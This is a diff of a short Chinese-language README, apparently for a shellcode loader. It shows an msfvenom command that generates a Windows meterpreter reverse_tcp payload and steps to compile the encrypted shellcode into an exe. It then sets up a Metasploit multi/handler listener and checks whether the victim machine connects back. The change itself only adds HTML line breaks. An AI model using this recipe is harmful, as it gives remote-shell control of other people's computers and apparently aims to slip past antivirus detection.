@@ -9,10 +9,10 @@ msfvenom LHOST=x.x.x.x LPORT=443 -p windows/x64/meterpreter/reverse_tcp -f c
 ## 编译加载器
 将加密后的shellcode 复制到加载器的shellcode变量中编译
 ## 准备msf监听器
-msfconsole
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set LHOST x.x.x.x
-set LPORT 443
-run
+msfconsole<br />
+use exploit/multi/handler<br />
+set payload windows/x64/meterpreter/reverse_tcp<br />
+set LHOST x.x.x.x<br />
+set LPORT 443<br />
+run<br />
 ## 双击编译好的exe观察是否上线
